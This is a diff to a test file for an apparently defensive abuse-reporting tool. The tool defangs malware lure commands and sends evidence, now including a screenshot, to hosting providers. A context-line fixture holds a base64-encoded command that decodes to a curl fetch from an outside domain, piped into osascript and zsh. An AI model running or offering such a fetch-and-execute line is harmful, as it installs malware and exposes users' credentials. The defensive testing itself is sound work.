@@ -26,6 +26,8 @@ afterAll(() => {
 const PANEO_COMMAND = `echo "https://apps.apple.com/app/paneo-install"; echo 'Y3VybCAtc2ZMIGh0dHBzOi8va2V5Y2hhaW5hZ2VudC5wcm8vd2tzeGdqL3daWkxSOXhZMjlvNCB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' | base64 -d | zsh`;
 const PAYLOAD_URL = "https://keychainagent.pro/wksxgj/wZZLR9xY29o4";
 const PAYLOAD = Buffer.from("var platformDispatcher = this[(function(){ /* obfuscated JXA loader */ })()];");
+// A decodable 1×1 PNG: the page report's screenshot evidence.
+const SCREENSHOT = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==", "base64");
 
 async function confirmedCase(id: bigint, finding: Parameters<typeof reportConfirmedWebsiteAbuse>[0]["finding"], url = "https://paneo.work/") {
 	await SubmissionsEntity.create({ id, kind: "website", data: { kind: "website", website: { url } }, dedupeKey: `investigation:${id.toString()}` });
@@ -36,6 +38,7 @@ async function confirmedCase(id: bigint, finding: Parameters<typeof reportConfir
 		reporter: {},
 		finding,
 		pasteCommands: finding.finding === "malware" ? extractPasteCommands(PANEO_COMMAND) : [],
+		screenshotPng: SCREENSHOT,
 	});
 	const job = (await getDb()).select().from(abuseJobs).where(eq(abuseJobs.reportId, report.reportId)).get()!;
 	return { report, job };
@@ -109,6 +112,12 @@ describe("pre-report investigation", () => {
 		expect(hostReport.description).toContain("Command shown on the page (defanged): ");
 		expect(hostReport.description).toContain("[pipe] base64 -d [pipe] zsh");
 		expect(hostReport.description).not.toContain("| zsh");
+		// The lure page's screenshot travels with the host report; image-only forms (Eranet) require it.
+		const hostEvidence = (await AbuseRepository.getReportInput(hostReport.id))!.evidenceArtifacts;
+		expect(hostEvidence.map((artifact) => [artifact.name, artifact.mimeType])).toEqual([
+			["malware-payload-evidence.json", "application/json"],
+			["lure-page.png", "image/png"],
+		]);
 		expect((await AbuseRepository.listTargets(hostReport.id)).map((target) => [target.normalizedTarget, target.observedUrls])).toEqual([["keychainagent.pro", [PAYLOAD_URL]]]);
 
 		expect((await SubmissionsEntity.get(submissionId))?.data).toMatchObject({ website: { investigation: {
